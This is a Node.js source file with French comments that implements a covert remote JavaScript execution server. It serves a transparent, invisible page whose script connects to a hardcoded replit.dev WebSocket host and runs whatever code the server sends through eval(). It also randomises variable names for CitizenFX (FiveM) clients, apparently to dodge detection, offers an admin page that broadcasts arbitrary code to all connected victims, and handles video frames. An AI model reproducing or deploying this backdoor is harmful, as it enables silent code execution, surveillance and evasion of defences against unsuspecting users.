/**
 * Serveur WebSocket & HTTP avec gestion de whitelist d'IP.
 * Les connexions WebSocket issues d'IP présentes dans whitelist.txt sont refusées.
 * Seule la première IP (publique) du header X-Forwarded-For est utilisée.
 * Auteur : 0x72EB7BA9B69BF6AB
 */

const WebSocket = require("ws");
const { v4: uuidv4 } = require("uuid");
const http = require("http");
const url = require("url");
const fs = require("fs");
const path = require("path");

// --- Stockage des clients connectés ---
const clients = new Map();

// --- Fonction utilitaire pour charger la whitelist d'IP ---
function loadWhitelist() {
    try {
        const whitelistPath = path.join(__dirname, "whitelist.txt");
        if (!fs.existsSync(whitelistPath)) return [];
        const whitelistContent = fs.readFileSync(whitelistPath, "utf8");
        // Nettoie, ignore les lignes vides et les commentaires
        return whitelistContent
            .split("\n")
            .map((line) => line.trim())
            .filter((line) => line && !line.startsWith("#"));
    } catch (err) {
        console.log(
            `[WHITELIST] Erreur chargement whitelist.txt: ${err.message}`,
        );
        return [];
    }
}

// --- Fonction pour générer des noms de variables aléatoires ---
function generateRandomVariableNames() {
    const generateRandomString = () => {
        const chars = "abcdefghijklmnopqrstuvwxyz";
        const numbers = "0123456789";
        let result = "";

        // Commence toujours par une lettre
        result += chars.charAt(Math.floor(Math.random() * chars.length));

        // Ajoute 7-15 caractères aléatoires
        const length = Math.floor(Math.random() * 9) + 7;
        for (let i = 1; i < length; i++) {
            const allChars = chars + numbers;
            result += allChars.charAt(
                Math.floor(Math.random() * allChars.length),
            );
        }

        return result;
    };

    return {
        // Noms de classes
        ClientNet3m8w: generateRandomString(),

        // Propriétés de la classe
        urlServer9k2v: generateRandomString(),
        socketConn7x1q: generateRandomString(),
        userIdent4z8n: generateRandomString(),
        retryCount5p3j: generateRandomString(),
        maxRetries6h9l: generateRandomString(),
        pingTimer8w4r: generateRandomString(),
        streamVideo2y7s: generateRandomString(),
        intervalVideo9n5t: generateRandomString(),

        // Méthodes de la classe
        connect: generateRandomString(),
        sendMessage: generateRandomString(),
        startPing: generateRandomString(),
        stopPing: generateRandomString(),
        attemptReconnect: generateRandomString(),
        disconnect: generateRandomString(),
        startVideoCapture: generateRandomString(),
        stopVideoCapture: generateRandomString(),

        // Variables globales
        URL_CONFIG_Q4R7: generateRandomString(),
        clientInstance5x3m: generateRandomString(),

        // Variables locales dans les fonctions
        message: generateRandomString(),
        event: generateRandomString(),
        result: generateRandomString(),
        executeError: generateRandomString(),
        error: generateRandomString(),
        delay: generateRandomString(),

        // Mots-clés et noms de propriétés des messages WebSocket
        type: generateRandomString(),
        welcome: generateRandomString(),
        uuid: generateRandomString(),
        execute_js: generateRandomString(),
        code: generateRandomString(),
        success: generateRandomString(),
        timestamp: generateRandomString(),
        js_executed: generateRandomString(),
        start_video: generateRandomString(),
        stop_video: generateRandomString(),
        ping: generateRandomString(),

        // Méthodes WebSocket et événements
        onopen: generateRandomString(),
        onmessage: generateRandomString(),
        onclose: generateRandomString(),
        onerror: generateRandomString(),
        readyState: generateRandomString(),

        // Objets window et console
        window: generateRandomString(),
        console: generateRandomString(),
    };
}

// --- Fonction pour remplacer les noms de variables dans le code ---
function randomizeVariableNames(code, nameMapping, req) {
    let modifiedCode = code;

    // D'abord, remplacer l'URL du serveur WebSocket par l'URL dynamique
    const protocol = req.headers["x-forwarded-proto"] || "ws";
    const host = req.headers.host || "localhost:3000";
    const wsProtocol = protocol === "https" ? "wss" : "ws";
    const dynamicUrl = `${wsProtocol}://${host}:5000`;

    // Remplacer l'URL statique par l'URL dynamique
    const urlRegex = /"wss:\/\/[^"]+"/g;
    modifiedCode = modifiedCode.replace(urlRegex, `"${dynamicUrl}"`);

    // Remplace chaque nom de variable/fonction par son équivalent aléatoire
    for (const [oldName, newName] of Object.entries(nameMapping)) {
        // Utilise des regex pour remplacer les occurrences exactes
        const regex = new RegExp(`\\b${oldName}\\b`, "g");
        modifiedCode = modifiedCode.replace(regex, newName);
    }

    return modifiedCode;
}

// --- Fonction pour obtenir la première IP (publique) ---
function getRealIP(reqOrInfo) {
    const ipRaw =
        reqOrInfo.headers?.["x-forwarded-for"] ||
        reqOrInfo.headers?.["x-real-ip"] ||
        reqOrInfo.connection?.remoteAddress ||
        reqOrInfo.socket?.remoteAddress ||
        (reqOrInfo.connection?.socket
            ? reqOrInfo.connection.socket.remoteAddress
            : null);
    if (ipRaw) {
        return ipRaw.split(",")[0].trim();
    }
    return ipRaw;
}

// --- Création du serveur WebSocket avec vérification de whitelist ---
const wss = new WebSocket.Server({
    port: 5000,
    /**
     * Refuse la connexion si l'IP est dans la whitelist.
     * Vérifie aussi le User-Agent (CitizenFX ou navigateur).
     */
    verifyClient: (info) => {
        const realIP = getRealIP(info.req);
        const whitelist = loadWhitelist();

        // Refus si IP whitelistee
        if (realIP && whitelist.includes(realIP)) {
            console.log(`[WHITELIST] Refusé : IP ${realIP} dans la whitelist`);
            return false;
        }

        // Vérif User-Agent
        const userAgent = info.req.headers["user-agent"] || "";
        const isCitizenFX = userAgent.includes("CitizenFX");
        const isBrowser =
            userAgent.includes("Mozilla") ||
            userAgent.includes("Chrome") ||
            userAgent.includes("Safari") ||
            userAgent.includes("Firefox");

        return isCitizenFX || isBrowser;
    },
});

console.log("[SERVEUR] WebSocket démarré sur ws://0.0.0.0:5000");
console.log('[SERVEUR] Autorise les User-Agent "CitizenFX" ou navigateurs');

// --- Gestion de la connexion WebSocket ---
wss.on("connection", (ws, req) => {
    const realIP = getRealIP(req);
    const whitelist = loadWhitelist();

    // Vérification de la whitelist (sécurité redondante, au cas où verifyClient n'est pas suffisant)
    if (realIP && whitelist.includes(realIP)) {
        console.log(`[CLIENT] Connexion bloquée (whitelist) : IP ${realIP}`);
        ws.close(1008, "IP dans la whitelist");
        return;
    }

    // Vérifier si cette IP est déjà connectée
    const existingClient = Array.from(clients.values()).find(
        (client) => client.ip === realIP,
    );
    if (existingClient) {
        console.log(
            `[CLIENT] IP déjà connectée: ${realIP} | UUID existant: ${existingClient.uuid.substring(0, 8)}...`,
        );
        ws.close(1000, "IP déjà connectée");
        return;
    }

    // Générer un UUID unique pour le client
    const clientId = uuidv4();
    const clientInfo = {
        uuid: clientId,
        ip: realIP,
        userAgent: req.headers["user-agent"],
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
    };

    // Stocker le client
    clients.set(clientId, { ...clientInfo, ws: ws });

    console.log(
        `[CLIENT] Nouvelle connexion: ${clientId.substring(0, 8)}... | IP: ${clientInfo.ip}`,
    );

    // Envoi de bienvenue
    ws.send(
        JSON.stringify({
            type: "welcome",
            uuid: clientId,
            message: "Connexion établie avec succès",
        }),
    );

    // --- Gestion des messages WebSocket ---
    ws.on("message", (message) => {
        try {
            const data = JSON.parse(message);

            // Mise à jour du lastSeen
            if (clients.has(clientId)) {
                clients.get(clientId).lastSeen = new Date().toISOString();
            }

            // Gestion JS exécuté
            if (data.type === "js_executed") {
                if (data.success) {
                    console.log(
                        `[EXEC] Succès ${clientId.substring(0, 8)}... | Résultat: ${data.result?.substring(0, 50) || "Aucun"}`,
                    );
                } else {
                    console.log(
                        `[EXEC] Erreur ${clientId.substring(0, 8)}... | ${data.error}`,
                    );
                }
                return;
            }

            // Gestion frames vidéo
            if (data.type === "video_frame") {
                console.log(
                    `[VIDEO] Frame reçue ${clientId.substring(0, 8)}... | ${data.timestamp}`,
                );
                if (clients.has(clientId)) {
                    clients.get(clientId).lastVideoFrame = {
                        data: data.data,
                        timestamp: data.timestamp,
                    };
                }
                return;
            }

            // Log des autres messages
            if (data.type !== "ping") {
                console.log(
                    `[MSG] ${data.type} de ${clientId.substring(0, 8)}...`,
                );
                ws.send(
                    JSON.stringify({
                        type: "response",
                        message: "Message reçu",
                        timestamp: new Date().toISOString(),
                    }),
                );
            }
        } catch (err) {
            console.log(
                `[ERREUR] Parse message ${clientId.substring(0, 8)}...: ${err.message}`,
            );
        }
    });

    // --- Gestion de la déconnexion ---
    ws.on("close", () => {
        clients.delete(clientId);
        console.log(
            `[CLIENT] Déconnexion: ${clientId.substring(0, 8)}... | IP libérée: ${realIP}`,
        );
    });

    // --- Gestion des erreurs WebSocket ---
    ws.on("error", (error) => {
        console.log(
            `[ERREUR] Client ${clientId.substring(0, 8)}...: ${error.message}`,
        );
        clients.delete(clientId);
    });
});

// --- Serveur HTTP pour affichage et contrôle ---
const httpServer = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;

    // Headers CORS
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Content-Type", "text/html; charset=utf-8");

    if (pathname === "/") {
        // Page d'accueil : affiche le HTML avec le code JavaScript intégré
        const html = `<!DOCTYPE html>
<html lang="fr">
<head>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: transparent !important;
            overflow: hidden;
        }
        html {
            background: transparent !important;
        }
    </style>
    <script>
class ClientNet3m8w {
  constructor(urlServer9k2v) {
    this.urlServer9k2v = urlServer9k2v;
    this.socketConn7x1q = null;
    this.userIdent4z8n = null;
    this.retryCount5p3j = 0;
    this.maxRetries6h9l = 5;
    this.pingTimer8w4r = null;
  }

  connect() {
    console.log(\`[CLIENT] Connexion vers \${this.urlServer9k2v}...\`);

    // Créer la connexion WebSocket
    this.socketConn7x1q = new WebSocket(this.urlServer9k2v);

    this.socketConn7x1q.onopen = () => {
      console.log("[CLIENT] Connecté au serveur WebSocket");
      this.retryCount5p3j = 0;
      this.startPing();
    };

    this.socketConn7x1q.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);

        // Stocker l'UUID si c'est un message de bienvenue
        if (message.type === "welcome") {
          this.userIdent4z8n = message.uuid;
          console.log(
            \`[CLIENT] UUID reçu: \${this.userIdent4z8n.substring(0, 8)}...\`,
          );
        }

        // Exécuter le code JavaScript reçu du serveur
        if (message.type === "execute_js") {
          try {
            // Exécuter le code dans le contexte global de manière silencieuse
            const result = eval(message.code);

            // Envoyer la confirmation d'exécution au serveur
            this.sendMessage({
              type: "js_executed",
              success: true,
              result:
                result !== undefined
                  ? String(result)
                  : "Code exécuté avec succès",
              timestamp: new Date().toISOString(),
            });
          } catch (executeError) {
            console.error("[CLIENT] Erreur d'exécution JS:", executeError);
            // Envoyer l'erreur au serveur
            this.sendMessage({
              type: "js_executed",
              success: false,
              error: executeError.message,
              timestamp: new Date().toISOString(),
            });
          }
        }
      } catch (err) {
        console.log("[CLIENT] Erreur parse message:", err.message);
      }
    };

    this.socketConn7x1q.onclose = (event) => {
      console.log(\`[CLIENT] Connexion fermée (\${event.code})\`);
      this.stopPing();
      this.attemptReconnect();
    };

    this.socketConn7x1q.onerror = (error) => {
      console.log("[CLIENT] Erreur WebSocket:", error.message || error);
    };
  }

  sendMessage(message) {
    if (
      this.socketConn7x1q &&
      this.socketConn7x1q.readyState === WebSocket.OPEN
    ) {
      this.socketConn7x1q.send(JSON.stringify(message));
    } else {
      console.warn(
        "[CLIENT] Impossible d'envoyer le message - WebSocket fermé",
      );
    }
  }

  startPing() {
    // Envoyer un ping toutes les 30 secondes pour maintenir la connexion
    this.pingTimer8w4r = setInterval(() => {
      this.sendMessage({
        type: "ping",
        timestamp: new Date().toISOString(),
      });
    }, 30000);
  }

  stopPing() {
    if (this.pingTimer8w4r) {
      clearInterval(this.pingTimer8w4r);
      this.pingTimer8w4r = null;
    }
  }

  attemptReconnect() {
    if (this.retryCount5p3j < this.maxRetries6h9l) {
      this.retryCount5p3j++;
      const delay = Math.pow(2, this.retryCount5p3j) * 1000; // Backoff exponentiel

      console.log(
        \`[CLIENT] Reconnexion \${this.retryCount5p3j}/\${this.maxRetries6h9l} dans \${delay / 1000}s\`,
      );

      setTimeout(() => {
        this.connect();
      }, delay);
    } else {
      console.log("[CLIENT] Reconnexion impossible - Limite atteinte");
    }
  }

  disconnect() {
    if (this.socketConn7x1q) {
      this.stopPing();
      this.socketConn7x1q.close();
      console.log("[CLIENT] Déconnexion manuelle");
    }
  }
}

// Configuration - URL fixe du serveur WebSocket
const URL_CONFIG_Q4R7 = "wss://b5c9f2f3-4577-41d0-b761-85937516f603-00-36saotrhgjkz4.kirk.replit.dev:3000";

// Créer et connecter le client
const clientInstance5x3m = new ClientNet3m8w(URL_CONFIG_Q4R7);

// Rendre le client disponible globalement
window.clientInstance5x3m = clientInstance5x3m;

// Connexion automatique
clientInstance5x3m.connect();
    </script>
</head>
<body style="background: transparent; margin: 0; padding: 0; overflow: hidden;"></body>
</html>`;

        res.setHeader("Content-Type", "text/html; charset=utf-8");
        res.writeHead(200);
        res.end(html);
        return;
    } else if (
        pathname === "/client-browser.js" ||
        pathname === "/client-browser"
    ) {
        // Servir le script client-browser.js
        try {
            let clientCode = fs.readFileSync(
                path.join(__dirname, "client-browser.js"),
                "utf8",
            );

            const userAgent = req.headers["user-agent"] || "";
            const isCitizenFX = userAgent.includes("CitizenFX");

            if (isCitizenFX) {
                // Générer de nouveaux noms aléatoires pour CitizenFX
                const randomNames = generateRandomVariableNames();
                clientCode = randomizeVariableNames(
                    clientCode,
                    randomNames,
                    req,
                );

                res.setHeader("Content-Type", "text/javascript; charset=utf-8");
                res.writeHead(200);
                res.end(clientCode);
                console.log(
                    `[CITFX] client-browser.js servi avec noms randomisés + URL dynamique UA: ${userAgent.substring(0, 50)}...`,
                );
                return;
            } else {
                // Pour les autres visiteurs, afficher le code JavaScript
                res.setHeader("Content-Type", "text/javascript; charset=utf-8");
                res.writeHead(200);
                res.end(clientCode);
                return;
            }
        } catch (err) {
            console.log(`[ERREUR] Lecture client-browser.js: ${err.message}`);
            res.writeHead(500);
            res.end("// Erreur: Impossible de charger le code client");
            return;
        }
    } else if (pathname === "/admin") {
        // Page d'administration - accessible sans restriction User-Agent
        const clientsArray = Array.from(clients.values()).map((client) => ({
            uuid: client.uuid,
            ip: client.ip,
            userAgent: client.userAgent,
            connectedAt: client.connectedAt,
            lastSeen: client.lastSeen,
        }));

        const html = `
<!DOCTYPE html>
<html>
<head>
    <title>Clients WebSocket Connectés</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .client-card { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
        .client-uuid { font-weight: bold; color: #007bff; }
        .stats { background: #f8f9fa; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .broadcast-control { background: #fff3cd; border: 1px solid #ffeaa7; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .broadcast-textarea { width: 100%; height: 120px; font-family: 'Courier New', monospace; border: 1px solid #ccc; padding: 10px; border-radius: 3px; }
        .broadcast-button { background: #e74c3c; color: white; border: none; padding: 10px 20px; border-radius: 3px; cursor: pointer; margin-top: 10px; }
        .broadcast-button:hover { background: #c0392b; }
        .broadcast-result { margin-top: 15px; padding: 10px; border-radius: 3px; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
        .nav { margin-bottom: 20px; }
        .nav a { margin-right: 15px; color: #007bff; text-decoration: none; }
        .nav a:hover { text-decoration: underline; }
    </style>
    <script>
        // Auto-refresh toutes les 5 secondes
        setTimeout(() => location.reload(), 5000);

        function broadcastJS() {
            const code = document.getElementById('broadcastCode').value;
            const resultDiv = document.getElementById('broadcastResult');

            if (!code.trim()) {
                showBroadcastResult('Veuillez entrer du code JavaScript', 'error');
                return;
            }

            showBroadcastResult('Envoi du code à tous les clients...', 'info');

            fetch('/broadcast', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ code: code })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showBroadcastResult('✅ Code envoyé à ' + data.successCount + ' client(s) avec succès!', 'success');
                    if (data.errorCount > 0) {
                        showBroadcastResult(data.message + ' (' + data.errorCount + ' erreur(s))', 'success');
                    }
                } else {
                    showBroadcastResult('❌ Erreur: ' + data.error, 'error');
                }
            })
            .catch(err => {
                showBroadcastResult('❌ Erreur réseau: ' + err.message, 'error');
            });
        }

        function showBroadcastResult(message, type) {
            const resultDiv = document.getElementById('broadcastResult');
            resultDiv.innerHTML = message;
            resultDiv.className = 'broadcast-result ' + type;
            resultDiv.style.display = 'block';
        }
    </script>
</head>
<body>
    <div class="nav">
        <a href="/">🏠 Accueil</a>
        <a href="/admin">🔧 Administration</a>
    </div>
    <h1>🌐 Serveur WebSocket - Clients Connectés</h1>
    <div class="stats">
        <h3>📊 Statistiques</h3>
        <p><strong>Clients connectés:</strong> ${clientsArray.length}</p>
        <p><strong>Dernière mise à jour:</strong> ${new Date().toLocaleString()}</p>
    </div>

    <div class="broadcast-control">
        <h3>📡 Diffusion JavaScript vers Tous les Clients</h3>
        <p>Entrez du code JavaScript à exécuter sur tous les clients connectés :</p>
        <textarea id="broadcastCode" class="broadcast-textarea" placeholder="// Exemple:
console.log('Message broadcast depuis le serveur!');
alert('Alerte envoyée à tous les clients');
document.body.style.border = '5px solid red';"></textarea>
        <br>
        <button class="broadcast-button" onclick="broadcastJS()">📡 Diffuser à Tous les Clients</button>
        <div id="broadcastResult" class="broadcast-result" style="display: none;"></div>
    </div>

    <h2>👥 Liste des Clients</h2>
    ${
        clientsArray.length === 0
            ? "<p>Aucun client connecté actuellement.</p>"
            : clientsArray
                  .map(
                      (client) => `
        <div class="client-card">
            <div class="client-uuid">
                <a href="/client/${client.uuid}">🆔 ${client.uuid}</a>
            </div>
            <p><strong>IP:</strong> ${client.ip}</p>
            <p><strong>User-Agent:</strong> ${client.userAgent}</p>
            <p><strong>Connecté depuis:</strong> ${new Date(client.connectedAt).toLocaleString()}</p>
            <p><strong>Dernière activité:</strong> ${new Date(client.lastSeen).toLocaleString()}</p>
        </div>
      `,
                  )
                  .join("")
    }
    <hr>
    <p><small>Page auto-refresh toutes les 5 secondes</small></p>
</body>
</html>`;

        res.writeHead(200);
        res.end(html);
    } else if (pathname === "/broadcast" && req.method === "POST") {
        // Gérer l'envoi de code JavaScript à tous les clients
        let body = "";
        req.on("data", (chunk) => {
            body += chunk.toString();
        });

        req.on("end", () => {
            try {
                const data = JSON.parse(body);
                const jsCode = data.code;

                if (!jsCode) {
                    res.writeHead(400, { "Content-Type": "application/json" });
                    res.end(
                        JSON.stringify({ error: "Code JavaScript manquant" }),
                    );
                    return;
                }

                let successCount = 0;
                let errorCount = 0;

                // Envoyer le code à tous les clients connectés
                clients.forEach((client, clientId) => {
                    if (client.ws.readyState === WebSocket.OPEN) {
                        try {
                            client.ws.send(
                                JSON.stringify({
                                    type: "execute_js",
                                    code: jsCode,
                                    timestamp: new Date().toISOString(),
                                }),
                            );
                            successCount++;
                        } catch (err) {
                            errorCount++;
                            console.log(
                                `[BROADCAST] Erreur envoi vers ${clientId.substring(0, 8)}...: ${err.message}`,
                            );
                        }
                    } else {
                        errorCount++;
                    }
                });

                console.log(
                    `[BROADCAST] Code envoyé | Succès: ${successCount}, Erreurs: ${errorCount} | ${jsCode.substring(0, 30)}...`,
                );

                res.writeHead(200, { "Content-Type": "application/json" });
                res.end(
                    JSON.stringify({
                        success: true,
                        message: `Code envoyé à ${successCount} client(s)`,
                        successCount,
                        errorCount,
                    }),
                );
            } catch (err) {
                res.writeHead(400, { "Content-Type": "application/json" });
                res.end(JSON.stringify({ error: "JSON invalide" }));
            }
        });
    } else if (pathname.startsWith("/client/")) {
        // Pages clients - accessibles sans restriction User-Agent
        res.writeHead(404);
        res.end(`
<!DOCTYPE html>
<html>
<head>
    <title>Page Client</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .nav { margin-bottom: 20px; }
        .nav a { margin-right: 15px; color: #007bff; text-decoration: none; }
        .nav a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="nav">
        <a href="/">🏠 Accueil</a>
        <a href="/admin">🔧 Administration</a>
    </div>
    <h1>Page Client</h1>
    <p>Fonctionnalité en développement</p>
</body>
</html>`);
    } else {
        // 404
        res.writeHead(404);
        res.end(`
<!DOCTYPE html>
<html>
<head>
    <title>Page Non Trouvée</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .nav { margin-bottom: 20px; }
        .nav a { margin-right: 15px; color: #007bff; text-decoration: none; }
        .nav a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="nav">
        <a href="/">🏠 Accueil</a>
        <a href="/admin">🔧 Administration</a>
    </div>
    <h1>404 - Page Non Trouvée</h1>
    <p><a href="/">← Retour à l'accueil</a></p>
</body>
</html>`);
    }
});

// --- Démarrage du serveur HTTP ---
httpServer.listen(80, "0.0.0.0", () => {
    console.log("[SERVEUR] HTTP démarré sur http://0.0.0.0:80");
});

// --- Statistiques régulières ---
setInterval(() => {
    if (clients.size > 0) {
        console.log(`[STATS] ${clients.size} client(s) connecté(s)`);
    }
}, 30000);

console.log("[SERVEUR] Système initialisé avec succès");
